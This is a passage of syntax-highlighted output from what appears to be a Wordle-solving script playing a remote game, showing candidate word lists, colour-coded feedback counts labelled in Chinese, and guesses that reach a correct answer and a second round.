class="string">&#x27;tepee&#x27;</span>, <span class="string">&#x27;brace&#x27;</span>, <span class="string">&#x27;froze&#x27;</span>, <span class="string">&#x27;moose&#x27;</span>, <span class="string">&#x27;image&#x27;</span>, <span class="string">&#x27;chime&#x27;</span>, <span class="string">&#x27;curve&#x27;</span>, <span class="string">&#x27;drive&#x27;</span>, <span class="string">&#x27;fudge&#x27;</span>, <span class="string">&#x27;forte&#x27;</span>, <span class="string">&#x27;whine&#x27;</span>, <span class="string">&#x27;whose&#x27;</span>, <span class="string">&#x27;crone&#x27;</span>, <span class="string">&#x27;pulse&#x27;</span>, <span class="string">&#x27;hence&#x27;</span>, <span class="string">&#x27;piece&#x27;</span>, <span class="string">&#x27;blame&#x27;</span>, <span class="string">&#x27;peace&#x27;</span>, <span class="string">&#x27;untie&#x27;</span>, <span class="string">&#x27;judge&#x27;</span>, <span class="string">&#x27;homme&#x27;</span>, <span class="string">&#x27;thine&#x27;</span>, <span class="string">&#x27;jeune&#x27;</span>, <span class="string">&#x27;monde&#x27;</span>, <span class="string">&#x27;fille&#x27;</span>, <span class="string">&#x27;mille&#x27;</span>, <span class="string">&#x27;bonne&#x27;</span>, <span class="string">&#x27;comte&#x27;</span>, <span class="string">&#x27;donne&#x27;</span>, <span class="string">&#x27;forme&#x27;</span>, <span class="string">&#x27;afore&#x27;</span>, <span class="string">&#x27;foule&#x27;</span>, <span class="string">&#x27;livre&#x27;</span>, <span class="string">&#x27;welke&#x27;</span>, <span class="string">&#x27;douce&#x27;</span>, <span class="string">&#x27;tinge&#x27;</span>, <span class="string">&#x27;geste&#x27;</span>, <span class="string">&#x27;cesse&#x27;</span>, <span class="string">&#x27;fosse&#x27;</span>, <span class="string">&#x27;prise&#x27;</span>, <span class="string">&#x27;monte&#x27;</span>, <span class="string">&#x27;frere&#x27;</span>, <span class="string">&#x27;titre&#x27;</span>, <span class="string">&#x27;outre&#x27;</span>, <span class="string">&#x27;gwine&#x27;</span>, <span class="string">&#x27;metre&#x27;</span>, <span class="string">&#x27;folie&#x27;</span>, <span class="string">&#x27;bitte&#x27;</span>, <span class="string">&#x27;quale&#x27;</span>, <span class="string">&#x27;clime&#x27;</span>, <span class="string">&#x27;levee&#x27;</span>, <span class="string">&#x27;heare&#x27;</span>, <span class="string">&#x27;voile&#x27;</span>, <span class="string">&#x27;chere&#x27;</span>, <span class="string">&#x27;feare&#x27;</span>, <span class="string">&#x27;glace&#x27;</span>, <span class="string">&#x27;apace&#x27;</span>, <span class="string">&#x27;vilde&#x27;</span>, <span class="string">&#x27;conte&#x27;</span>, <span class="string">&#x27;brise&#x27;</span>, <span class="string">&#x27;gerne&#x27;</span>, <span class="string">&#x27;crape&#x27;</span>, <span class="string">&#x27;toile&#x27;</span>, <span class="string">&#x27;beare&#x27;</span>, <span class="string">&#x27;longe&#x27;</span>, <span class="string">&#x27;ronde&#x27;</span>, <span class="string">&#x27;meane&#x27;</span>, <span class="string">&#x27;whore&#x27;</span>, <span class="string">&#x27;chuse&#x27;</span>, <span class="string">&#x27;tenue&#x27;</span>, <span class="string">&#x27;blive&#x27;</span>, <span class="string">&#x27;corse&#x27;</span>, <span class="string">&#x27;prate&#x27;</span>, <span class="string">&#x27;mitre&#x27;</span>, <span class="string">&#x27;crise&#x27;</span>, <span class="string">&#x27;lieve&#x27;</span>, <span class="string">&#x27;morne&#x27;</span>, <span class="string">&#x27;chile&#x27;</span>, <span class="string">&#x27;gorse&#x27;</span>, <span class="string">&#x27;deare&#x27;</span>, <span class="string">&#x27;breve&#x27;</span>, <span class="string">&#x27;volte&#x27;</span>, <span class="string">&#x27;furze&#x27;</span>, <span class="string">&#x27;coude&#x27;</span>, <span class="string">&#x27;knowe&#x27;</span>, <span class="string">&#x27;grise&#x27;</span>, <span class="string">&#x27;dolce&#x27;</span>, <span class="string">&#x27;dulce&#x27;</span>, <span class="string">&#x27;russe&#x27;</span>, <span class="string">&#x27;youse&#x27;</span>, <span class="string">&#x27;borde&#x27;</span>, <span class="string">&#x27;nonce&#x27;</span>, <span class="string">&#x27;thane&#x27;</span>, <span class="string">&#x27;pease&#x27;</span>, <span class="string">&#x27;rente&#x27;</span>, <span class="string">&#x27;drole&#x27;</span>, <span class="string">&#x27;agone&#x27;</span>, <span class="string">&#x27;drave&#x27;</span>, <span class="string">&#x27;usque&#x27;</span>, <span class="string">&#x27;brume&#x27;</span>, <span class="string">&#x27;trone&#x27;</span>, <span class="string">&#x27;amene&#x27;</span>, <span class="string">&#x27;moste&#x27;</span>, <span class="string">&#x27;ochre&#x27;</span>, <span class="string">&#x27;fiere&#x27;</span>, <span class="string">&#x27;roule&#x27;</span>, <span class="string">&#x27;plage&#x27;</span>, <span class="string">&#x27;quare&#x27;</span>, <span class="string">&#x27;toque&#x27;</span>, <span class="string">&#x27;deere&#x27;</span>, <span class="string">&#x27;allee&#x27;</span>, <span class="string">&#x27;conge&#x27;</span>, <span class="string">&#x27;weise&#x27;</span>, <span class="string">&#x27;quire&#x27;</span>, <span class="string">&#x27;boite&#x27;</span>, <span class="string">&#x27;botte&#x27;</span>, <span class="string">&#x27;kopje&#x27;</span>, <span class="string">&#x27;plebe&#x27;</span>, <span class="string">&#x27;clave&#x27;</span>, <span class="string">&#x27;lemme&#x27;</span>, <span class="string">&#x27;blase&#x27;</span>, <span class="string">&#x27;brule&#x27;</span>, <span class="string">&#x27;gimme&#x27;</span>, <span class="string">&#x27;chine&#x27;</span>, <span class="string">&#x27;nieve&#x27;</span>, <span class="string">&#x27;nitre&#x27;</span>, <span class="string">&#x27;piste&#x27;</span>, <span class="string">&#x27;prese&#x27;</span>, <span class="string">&#x27;glebe&#x27;</span>, <span class="string">&#x27;tenne&#x27;</span>, <span class="string">&#x27;poule&#x27;</span>, <span class="string">&#x27;teste&#x27;</span>, <span class="string">&#x27;golpe&#x27;</span>, <span class="string">&#x27;etage&#x27;</span>, <span class="string">&#x27;eyrie&#x27;</span>, <span class="string">&#x27;bouge&#x27;</span>, <span class="string">&#x27;kluge&#x27;</span>, <span class="string">&#x27;chace&#x27;</span>, <span class="string">&#x27;brede&#x27;</span>, <span class="string">&#x27;venge&#x27;</span>, <span class="string">&#x27;bonie&#x27;</span>, <span class="string">&#x27;inure&#x27;</span>, <span class="string">&#x27;litre&#x27;</span>, <span class="string">&#x27;peece&#x27;</span>, <span class="string">&#x27;fiche&#x27;</span>, <span class="string">&#x27;weeke&#x27;</span>, <span class="string">&#x27;perce&#x27;</span>, <span class="string">&#x27;powre&#x27;</span>, <span class="string">&#x27;chyle&#x27;</span>, <span class="string">&#x27;ukase&#x27;</span>, <span class="string">&#x27;bowie&#x27;</span>, <span class="string">&#x27;reeve&#x27;</span>, <span class="string">&#x27;throe&#x27;</span>, <span class="string">&#x27;phare&#x27;</span>, <span class="string">&#x27;dowle&#x27;</span>]</span><br><span class="line">coude</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[43m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">白色 <span class="number">1766</span></span><br><span class="line">白色 <span class="number">1450</span></span><br><span class="line">白色 <span class="number">1384</span></span><br><span class="line">白色 <span class="number">1343</span></span><br><span class="line">黄色 <span class="number">480</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;e1&#x27;</span>, <span class="number">48</span>), (<span class="string">&#x27;e3&#x27;</span>, <span class="number">83</span>), (<span class="string">&#x27;r5&#x27;</span>, <span class="number">97</span>), (<span class="string">&#x27;e2&#x27;</span>, <span class="number">189</span>), (<span class="string">&#x27;e4&#x27;</span>, <span class="number">239</span>)]</span><br><span class="line">[<span class="string">&#x27;quiet&#x27;</span>, <span class="string">&#x27;unfed&#x27;</span>, <span class="string">&#x27;linen&#x27;</span>, <span class="string">&#x27;unmet&#x27;</span>, <span class="string">&#x27;bleed&#x27;</span>, <span class="string">&#x27;greet&#x27;</span>, <span class="string">&#x27;islet&#x27;</span>, <span class="string">&#x27;hyper&#x27;</span>, <span class="string">&#x27;tweed&#x27;</span>, <span class="string">&#x27;fixer&#x27;</span>, <span class="string">&#x27;finer&#x27;</span>, <span class="string">&#x27;usher&#x27;</span>, <span class="string">&#x27;abbey&#x27;</span>, <span class="string">&#x27;elder&#x27;</span>, <span class="string">&#x27;ulcer&#x27;</span>, <span class="string">&#x27;other&#x27;</span>, <span class="string">&#x27;renew&#x27;</span>, <span class="string">&#x27;fewer&#x27;</span>, <span class="string">&#x27;askew&#x27;</span>, <span class="string">&#x27;asset&#x27;</span>, <span class="string">&#x27;egret&#x27;</span>, <span class="string">&#x27;liver&#x27;</span>, <span class="string">&#x27;upset&#x27;</span>, <span class="string">&#x27;alien&#x27;</span>, <span class="string">&#x27;ruder&#x27;</span>, <span class="string">&#x27;onset&#x27;</span>, <span class="string">&#x27;inter&#x27;</span>, <span class="string">&#x27;unset&#x27;</span>, <span class="string">&#x27;libel&#x27;</span>, <span class="string">&#x27;piney&#x27;</span>, <span class="string">&#x27;threw&#x27;</span>, <span class="string">&#x27;fleet&#x27;</span>, <span class="string">&#x27;deter&#x27;</span>, <span class="string">&#x27;rivet&#x27;</span>, <span class="string">&#x27;udder&#x27;</span>, <span class="string">&#x27;given&#x27;</span>, <span class="string">&#x27;octet&#x27;</span>, <span class="string">&#x27;risen&#x27;</span>, <span class="string">&#x27;diner&#x27;</span>, <span class="string">&#x27;embed&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>, <span class="string">&#x27;queer&#x27;</span>, <span class="string">&#x27;freer&#x27;</span>, <span class="string">&#x27;plier&#x27;</span>, <span class="string">&#x27;nicer&#x27;</span>, <span class="string">&#x27;pried&#x27;</span>, <span class="string">&#x27;tenet&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, <span class="string">&#x27;flier&#x27;</span>, <span class="string">&#x27;fiber&#x27;</span>, <span class="string">&#x27;kneel&#x27;</span>, <span class="string">&#x27;flyer&#x27;</span>, <span class="string">&#x27;beset&#x27;</span>, <span class="string">&#x27;ruler&#x27;</span>, <span class="string">&#x27;aider&#x27;</span>, <span class="string">&#x27;river&#x27;</span>, <span class="string">&#x27;betel&#x27;</span>, <span class="string">&#x27;often&#x27;</span>, <span class="string">&#x27;diver&#x27;</span>, <span class="string">&#x27;alley&#x27;</span>, <span class="string">&#x27;vixen&#x27;</span>, <span class="string">&#x27;outer&#x27;</span>, <span class="string">&#x27;excel&#x27;</span>, <span class="string">&#x27;queen&#x27;</span>, <span class="string">&#x27;enter&#x27;</span>, <span class="string">&#x27;filet&#x27;</span>, <span class="string">&#x27;inner&#x27;</span>, <span class="string">&#x27;otter&#x27;</span>, <span class="string">&#x27;level&#x27;</span>, <span class="string">&#x27;tuber&#x27;</span>, <span class="string">&#x27;grief&#x27;</span>, <span class="string">&#x27;buyer&#x27;</span>, <span class="string">&#x27;ashen&#x27;</span>, <span class="string">&#x27;offer&#x27;</span>, <span class="string">&#x27;dryer&#x27;</span>, <span class="string">&#x27;infer&#x27;</span>, <span class="string">&#x27;ether&#x27;</span>, <span class="string">&#x27;idler&#x27;</span>, <span class="string">&#x27;timer&#x27;</span>, <span class="string">&#x27;wheel&#x27;</span>, <span class="string">&#x27;rebel&#x27;</span>, <span class="string">&#x27;ester&#x27;</span>, <span class="string">&#x27;thief&#x27;</span>, <span class="string">&#x27;tweet&#x27;</span>, <span class="string">&#x27;giver&#x27;</span>, <span class="string">&#x27;preen&#x27;</span>, <span class="string">&#x27;bevel&#x27;</span>, <span class="string">&#x27;wider&#x27;</span>, <span class="string">&#x27;breed&#x27;</span>, <span class="string">&#x27;brief&#x27;</span>, <span class="string">&#x27;never&#x27;</span>, <span class="string">&#x27;duvet&#x27;</span>, <span class="string">&#x27;after&#x27;</span>, <span class="string">&#x27;owner&#x27;</span>, <span class="string">&#x27;ember&#x27;</span>, <span class="string">&#x27;plied&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;defer&#x27;</span>, <span class="string">&#x27;drier&#x27;</span>, <span class="string">&#x27;jewel&#x27;</span>, <span class="string">&#x27;hymen&#x27;</span>, <span class="string">&#x27;freed&#x27;</span>, <span class="string">&#x27;alter&#x27;</span>, <span class="string">&#x27;utter&#x27;</span>, <span class="string">&#x27;piper&#x27;</span>, <span class="string">&#x27;riper&#x27;</span>, <span class="string">&#x27;pixel&#x27;</span>, <span class="string">&#x27;liner&#x27;</span>, <span class="string">&#x27;unwed&#x27;</span>, <span class="string">&#x27;order&#x27;</span>, <span class="string">&#x27;widen&#x27;</span>, <span class="string">&#x27;annex&#x27;</span>, <span class="string">&#x27;under&#x27;</span>, <span class="string">&#x27;refer&#x27;</span>, <span class="string">&#x27;olden&#x27;</span>, <span class="string">&#x27;older&#x27;</span>, <span class="string">&#x27;miner&#x27;</span>, <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;abled&#x27;</span>, <span class="string">&#x27;viper&#x27;</span>, <span class="string">&#x27;kneed&#x27;</span>, <span class="string">&#x27;odder&#x27;</span>, <span class="string">&#x27;tried&#x27;</span>, <span class="string">&#x27;dicey&#x27;</span>, <span class="string">&#x27;leper&#x27;</span>, <span class="string">&#x27;bicep&#x27;</span>, <span class="string">&#x27;bused&#x27;</span>, <span class="string">&#x27;fever&#x27;</span>, <span class="string">&#x27;expel&#x27;</span>, <span class="string">&#x27;revel&#x27;</span>, <span class="string">&#x27;video&#x27;</span>, <span class="string">&#x27;apnea&#x27;</span>, <span class="string">&#x27;purer&#x27;</span>, <span class="string">&#x27;greed&#x27;</span>, <span class="string">&#x27;liken&#x27;</span>, <span class="string">&#x27;beret&#x27;</span>, <span class="string">&#x27;lumen&#x27;</span>, <span class="string">&#x27;amber&#x27;</span>, <span class="string">&#x27;fried&#x27;</span>, <span class="string">&#x27;miser&#x27;</span>, <span class="string">&#x27;bezel&#x27;</span>, <span class="string">&#x27;filer&#x27;</span>, <span class="string">&#x27;newer&#x27;</span>, <span class="string">&#x27;lever&#x27;</span>, <span class="string">&#x27;repel&#x27;</span>, <span class="string">&#x27;meter&#x27;</span>, <span class="string">&#x27;dried&#x27;</span>, <span class="string">&#x27;bleep&#x27;</span>, <span class="string">&#x27;rider&#x27;</span>, <span class="string">&#x27;wiser&#x27;</span>, <span class="string">&#x27;impel&#x27;</span>, <span class="string">&#x27;inlet&#x27;</span>, <span class="string">&#x27;ripen&#x27;</span>, <span class="string">&#x27;riser&#x27;</span>, <span class="string">&#x27;asked&#x27;</span>, <span class="string">&#x27;added&#x27;</span>, <span class="string">&#x27;lived&#x27;</span>, <span class="string">&#x27;fixed&#x27;</span>, <span class="string">&#x27;liked&#x27;</span>, <span class="string">&#x27;tired&#x27;</span>, <span class="string">&#x27;ended&#x27;</span>, <span class="string">&#x27;armed&#x27;</span>, <span class="string">&#x27;acted&#x27;</span>, <span class="string">&#x27;mixed&#x27;</span>, <span class="string">&#x27;fired&#x27;</span>, <span class="string">&#x27;assez&#x27;</span>, <span class="string">&#x27;owned&#x27;</span>, <span class="string">&#x27;dined&#x27;</span>, <span class="string">&#x27;hired&#x27;</span>, <span class="string">&#x27;filed&#x27;</span>, <span class="string">&#x27;ruled&#x27;</span>, <span class="string">&#x27;vexed&#x27;</span>, <span class="string">&#x27;lined&#x27;</span>, <span class="string">&#x27;piled&#x27;</span>, <span class="string">&#x27;aided&#x27;</span>, <span class="string">&#x27;wiped&#x27;</span>, <span class="string">&#x27;aimed&#x27;</span>, <span class="string">&#x27;mused&#x27;</span>, <span class="string">&#x27;ached&#x27;</span>, <span class="string">&#x27;lured&#x27;</span>, <span class="string">&#x27;dived&#x27;</span>, <span class="string">&#x27;leben&#x27;</span>, <span class="string">&#x27;fined&#x27;</span>, <span class="string">&#x27;aimer&#x27;</span>, <span class="string">&#x27;erred&#x27;</span>, <span class="string">&#x27;objet&#x27;</span>, <span class="string">&#x27;fused&#x27;</span>, <span class="string">&#x27;piped&#x27;</span>, <span class="string">&#x27;pined&#x27;</span>, <span class="string">&#x27;oiled&#x27;</span>, <span class="string">&#x27;prier&#x27;</span>, <span class="string">&#x27;wired&#x27;</span>, <span class="string">&#x27;duped&#x27;</span>, <span class="string">&#x27;tuned&#x27;</span>, <span class="string">&#x27;timed&#x27;</span>, <span class="string">&#x27;hewed&#x27;</span>, <span class="string">&#x27;ebbed&#x27;</span>, <span class="string">&#x27;adieu&#x27;</span>, <span class="string">&#x27;tiled&#x27;</span>, <span class="string">&#x27;riven&#x27;</span>, <span class="string">&#x27;appel&#x27;</span>, <span class="string">&#x27;meted&#x27;</span>, <span class="string">&#x27;aspen&#x27;</span>, <span class="string">&#x27;ailed&#x27;</span>, <span class="string">&#x27;abler&#x27;</span>, <span class="string">&#x27;alder&#x27;</span>, <span class="string">&#x27;adder&#x27;</span>, <span class="string">&#x27;aired&#x27;</span>, <span class="string">&#x27;ither&#x27;</span>, <span class="string">&#x27;armer&#x27;</span>, <span class="string">&#x27;fumed&#x27;</span>, <span class="string">&#x27;anker&#x27;</span>, <span class="string">&#x27;keyed&#x27;</span>, <span class="string">&#x27;mined&#x27;</span>, <span class="string">&#x27;hiver&#x27;</span>, <span class="string">&#x27;brier&#x27;</span>, <span class="string">&#x27;gilet&#x27;</span>, <span class="string">&#x27;bided&#x27;</span>, <span class="string">&#x27;oriel&#x27;</span>, <span class="string">&#x27;heben&#x27;</span>, <span class="string">&#x27;fumer&#x27;</span>, <span class="string">&#x27;typed&#x27;</span>, <span class="string">&#x27;liber&#x27;</span>, <span class="string">&#x27;osier&#x27;</span>, <span class="string">&#x27;idled&#x27;</span>, <span class="string">&#x27;biped&#x27;</span>, <span class="string">&#x27;viler&#x27;</span>, <span class="string">&#x27;aster&#x27;</span>, <span class="string">&#x27;feted&#x27;</span>, <span class="string">&#x27;riled&#x27;</span>, <span class="string">&#x27;irked&#x27;</span>, <span class="string">&#x27;remet&#x27;</span>, <span class="string">&#x27;ivied&#x27;</span>, <span class="string">&#x27;muted&#x27;</span>, <span class="string">&#x27;mewed&#x27;</span>, <span class="string">&#x27;liker&#x27;</span>, <span class="string">&#x27;treed&#x27;</span>, <span class="string">&#x27;diced&#x27;</span>, <span class="string">&#x27;wexed&#x27;</span>]</span><br><span class="line">queer</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[47m  \x1b[0m \x1b[47m  \x1b[0m \x1b[43m  \x1b[0m \x1b[42m  \x1b[0m \x1b[43m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">白色 <span class="number">474</span></span><br><span class="line">白色 <span class="number">455</span></span><br><span class="line">黄色 <span class="number">378</span></span><br><span class="line">绿色 <span class="number">202</span></span><br><span class="line">黄色 <span class="number">29</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;r3&#x27;</span>, <span class="number">9</span>), (<span class="string">&#x27;r2&#x27;</span>, <span class="number">10</span>), (<span class="string">&#x27;r1&#x27;</span>, <span class="number">11</span>), (<span class="string">&#x27;d5&#x27;</span>, <span class="number">13</span>)]</span><br><span class="line">[<span class="string">&#x27;pried&#x27;</span>, <span class="string">&#x27;tried&#x27;</span>, <span class="string">&#x27;fried&#x27;</span>, <span class="string">&#x27;dried&#x27;</span>, <span class="string">&#x27;tired&#x27;</span>, <span class="string">&#x27;armed&#x27;</span>, <span class="string">&#x27;fired&#x27;</span>, <span class="string">&#x27;hired&#x27;</span>, <span class="string">&#x27;erred&#x27;</span>, <span class="string">&#x27;wired&#x27;</span>, <span class="string">&#x27;aired&#x27;</span>, <span class="string">&#x27;riled&#x27;</span>, <span class="string">&#x27;irked&#x27;</span>]</span><br><span class="line">b<span class="string">&#x27;Wrong!   \x1b[42m  \x1b[0m \x1b[47m  \x1b[0m \x1b[43m  \x1b[0m \x1b[42m  \x1b[0m \x1b[47m  \x1b[0m\n&gt; &#x27;</span></span><br><span class="line">绿色 <span class="number">11</span></span><br><span class="line">白色 <span class="number">6</span></span><br><span class="line">黄色 <span class="number">3</span></span><br><span class="line">绿色 <span class="number">3</span></span><br><span class="line">白色 <span class="number">3</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;p3&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line">[<span class="string">&#x27;repel&#x27;</span>]</span><br><span class="line">b<span class="string">&#x27;Correct! \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m \x1b[42m  \x1b[0m\nRound 2: #be3c1\n&gt; &#x27;</span></span><br><span class="line">绿色 <span class="number">3</span></span><br><span class="line">绿色 <span class="number">3</span></span><br><span class="line">绿色 <span class="number">1</span></span><br><span class="line">绿色 <span class="number">1</span></span><br><span class="line">绿色 <span class="number">1</span></span><br><span class="line"><span class="symbol">Q</span> [(<span class="string">&#x27;a3&#x27;</span>, <span class="number">486</span>), (<span class="string">&#x27;s1&#x27;</span>, <span class="number">563</span>), (<span class="string">&#x27;a2&#x27;</span>, <span class="number">689</span>), (<span class="string">&#x27;e4&#x27;</span>, <span class="number">793</span>), (<span class="string">&#x27;s5&#x27;</span>, <span class="number">1033</span>)]</span><br><span class="line">[<span class="string">&#x27;floss&#x27;</span>, <span class="string">&#x27;crass&#x27;</span>, <span class="string">&#x27;abyss&#x27;</span>, <span class="string">&#x27;rebus&#x27;</span>, <span class="string">&#x27;truss&#x27;</span>, <span class="string">&#x27;focus&#x27;</span>, <span class="string">&#x27;fetus&#x27;</span>, <span class="string">&#x27;glass&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;chaos&#x27;</span>, <span class="string">&#x27;dross&#x27;</span>, <span class="string">&#x27;cress&#x27;</span>, <span class="string">&#x27;bless&#x27;</span>, <span class="string">&#x27;bliss&#x27;</span>, <span class="string">&#x27;brass&#x27;</span>, <span class="string">&#x27;cross&#x27;</span>, <span class="string">&#x27;amass&#x27;</span>, <span class="string">&#x27;bonus&#x27;</span>, <span class="string">&#x27;locus&#x27;</span>, <span class="string">&#x27;grass&#x27;</span>, <span class="string">&#x27;ethos&#x27;</span>, <span class="string">&#x27;humus&#x27;</span>, <span class="string">&#x27;basis&#x27;</span>, <span class="string">&#x27;guess&#x27;</span>, <span class="string">&#x27;lupus&#x27;</span>, <span class="string">&#x27;torus&#x27;</span>, <span class="string">&#x27;minus&#x27;</span>, <span class="string">&#x27;dress&#x27;</span>, <span class="string">&#x27;amiss&#x27;</span>, <span class="string">&#x27;mucus&#x27;</span>, <span class="string">&#x27;gross&#x27;</span>, <span class="string">&#x27;gloss&#x27;</span>, <span class="string">&#x27;virus&#x27;</span>, <span class="string">&#x27;chess&#x27;</span>, <span class="string">&#x27;ficus&#x27;</span>, <span class="string">&#x27;press&#x27;</span>, <span class="string">&#x27;years&#x27;</span>, <span class="string">&#x27;words&#x27;</span>, <span class="string">&#x27;hands&#x27;</span>, <span class="string">&#x27;works&#x27;</span>, <span class="string">&#x27;means&#x27;</span>, <span class="string">&#x27;times&#x27;</span>, <span class="string">&#x27;terms&#x27;</span>, <span class="string">&#x27;seems&#x27;</span>, <span class="string">&#x27;miles&#x27;</span>, <span class="string">&#x27;comes&#x27;</span>, <span class="string">&#x27;hours&#x27;</span>, <span class="string">&#x27;makes&#x27;</span>, <span class="string">&#x27;books&#x27;</span>, <span class="string">&#x27;knows&#x27;</span>, <span class="string">&#x27;trees&#x27;</span>, <span class="string">&#x27;parts&#x27;</span>, <span class="string">&#x27;tears&#x27;</span>, <span class="string">&#x27;lines&#x27;</span>, <span class="string">&#x27;takes&#x27;</span>, <span class="string">&#x27;girls&#x27;</span>, <span class="string">&#x27;gives&#x27;</span>, <span class="string">&#x27;lives&#x27;</span>, <span class="string">&#x27;looks&#x27;</span>, <span class="string">&#x27;walls&#x27;</span>, <span class="string">&#x27;steps&#x27;</span>, <span class="string">&#x27;cases&#x27;</span>, <span class="string">&#x27;names&#x27;</span>, <span class="string">&#x27;forms&#x27;</span>, <span class="string">&#x27;heads&#x27;</span>, <span class="string">&#x27;ideas&#x27;</span>, <span class="string">&#x27;ships&#x27;</span>, <span class="string">&#x27;weeks&#x27;</span>, <span class="string">&#x27;sides&#x27;</span>, <span class="string">&#x27;facts&#x27;</span>, <span class="string">&#x27;hills&#x27;</span>, <span class="string">&#x27;faces&#x27;</span>, <span class="string">&#x27;birds&#x27;</span>, <span class="string">&#x27;tells&#x27;</span>, <span class="string">&#x27;rules&#x27;</span>, <span class="string">&#x27;wants&#x27;</span>, <span class="string">&#x27;hopes&#x27;</span>, <span class="string">&#x27;woods&#x27;</span>, <span class="string">&#x27;minds&#x27;</span>, <span class="string">&#x27;yours&#x27;</span>, <span class="string">&#x27;shows&#x27;</span>, <span class="string">&#x27;rocks&#x27;</span>, <span class="string">&#x27;notes&#x27;</span>, <span class="string">&#x27;needs&#x27;</span>, <span class="string">&#x27;lands&#x27;</span>, <span class="string">&#x27;stars&#x27;</span>, <span class="string">&#x27;rooms&#x27;</span>, <span class="string">&#x27;knees&#x27;</span>, <span class="string">&#x27;doors&#x27;</span>, <span class="string">&#x27;goods&#x27;</span>, <span class="string">&#x27;yards&#x27;</span>, <span class="string">&#x27;temps&#x27;</span>, <span class="string">&#x27;souls&#x27;</span>, <span class="string">&#x27;calls&#x27;</span>, <span class="string">&#x27;plans&#x27;</span>, <span class="string">&#x27;pages&#x27;</span>, <span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;signs&#x27;</span>, <span class="string">&#x27;kinds&#x27;</span>, <span class="string">&#x27;kings&#x27;</span>, <span class="string">&#x27;links&#x27;</span>, <span class="string">&#x27;files&#x27;</span>, <span class="string">&#x27;banks&#x27;</span>, <span class="string">&#x27;loves&#x27;</span>, <span class="string">&#x27;wings&#x27;</span>, <span class="string">&#x27;turns&#x27;</span>, <span class="string">&#x27;waves&#x27;</span>, <span class="string">&#x27;towns&#x27;</span>, <span class="string">&#x27;corps&#x27;</span>, <span class="string">&#x27;finds&#x27;</span>, <span class="string">&#x27;costs&#x27;</span>, <span class="string">&#x27;boats&#x27;</span>, <span class="string">&#x27;cries&#x27;</span>, <span class="string">&#x27;sorts&#x27;</span>, <span class="string">&#x27;falls&#x27;</span>, <span class="string">&#x27;gates&#x27;</span>, <span class="string">&#x27;bones&#x27;</span>, <span class="string">&#x27;trois&#x27;</span>, <span class="string">&#x27;winds&#x27;</span>, <span class="string">&#x27;fears&#x27;</span>, <span class="string">&#x27;wives&#x27;</span>, <span class="string">&#x27;holds&#x27;</span>, <span class="string">&#x27;roads&#x27;</span>, <span class="string">&#x27;gifts&#x27;</span>, <span class="string">&#x27;marks&#x27;</span>, <span class="string">&#x27;pains&#x27;</span>, <span class="string">&#x27;walks&#x27;</span>, <span class="string">&#x27;folks&#x27;</span>, <span class="string">&#x27;poets&#x27;</span>, <span class="string">&#x27;shoes&#x27;</span>, <span class="string">&#x27;deeds&#x27;</span>, <span class="string">&#x27;bears&#x27;</span>, <span class="string">&#x27;feels&#x27;</span>, <span class="string">&#x27;poems&#x27;</span>, <span class="string">&#x27;plays&#x27;</span>, <span class="string">&#x27;keeps&#x27;</span>, <span class="string">&#x27;songs&#x27;</span>, <span class="string">&#x27;leads&#x27;</span>, <span class="string">&#x27;limbs&#x27;</span>, <span class="string">&#x27;tones&#x27;</span>, <span class="string">&#x27;grows&#x27;</span>, <span class="string">&#x27;ranks&#x27;</span>, <span class="string">&#x27;tales&#x27;</span>, <span class="string">&#x27;boots&#x27;</span>, <span class="string">&#x27;seats&#x27;</span>, <span class="string">&#x27;fires&#x27;</span>, <span class="string">&#x27;jours&#x27;</span>, <span class="string">&#x27;cents&#x27;</span>, <span class="string">&#x27;roses&#x27;</span>, <span class="string">&#x27;roots&#x27;</span>, <span class="string">&#x27;pious&#x27;</span>, <span class="string">&#x27;wages&#x27;</span>, <span class="string">&#x27;blows&#x27;</span>, <span class="string">&#x27;cares&#x27;</span>, <span class="string">&#x27;rises&#x27;</span>, <span class="string">&#x27;ruins&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;lords&#x27;</span>, <span class="string">&#x27;dates&#x27;</span>, <span class="string">&#x27;homes&#x27;</span>, <span class="string">&#x27;drops&#x27;</span>, <span class="string">&#x27;likes&#x27;</span>, <span class="string">&#x27;cards&#x27;</span>, <span class="string">&#x27;races&#x27;</span>, <span class="string">&#x27;codes&#x27;</span>, <span class="string">&#x27;taxes&#x27;</span>, <span class="string">&#x27;ashes&#x27;</span>, <span class="string">&#x27;bells&#x27;</span>, <span class="string">&#x27;heels&#x27;</span>, <span class="string">&#x27;evils&#x27;</span>, <span class="string">&#x27;bands&#x27;</span>, <span class="string">&#x27;acres&#x27;</span>, <span class="string">&#x27;mains&#x27;</span>, <span class="string">&#x27;flies&#x27;</span>, <span class="string">&#x27;seeds&#x27;</span>, <span class="string">&#x27;sites&#x27;</span>, <span class="string">&#x27;bills&#x27;</span>, <span class="string">&#x27;holes&#x27;</span>, <span class="string">&#x27;sails&#x27;</span>, <span class="string">&#x27;rings&#x27;</span>, <span class="string">&#x27;boxes&#x27;</span>, <span class="string">&#x27;fools&#x27;</span>, <span class="string">&#x27;veins&#x27;</span>, <span class="string">&#x27;opens&#x27;</span>, <span class="string">&#x27;sends&#x27;</span>, <span class="string">&#x27;mines&#x27;</span>, <span class="string">&#x27;paths&#x27;</span>, <span class="string">&#x27;moves&#x27;</span>, <span class="string">&#x27;shops&#x27;</span>, <span class="string">&#x27;tents&#x27;</span>, <span class="string">&#x27;backs&#x27;</span>, <span class="string">&#x27;bonds&#x27;</span>, <span class="string">&#x27;games&#x27;</span>, <span class="string">&#x27;debts&#x27;</span>, <span class="string">&#x27;spots&#x27;</span>, <span 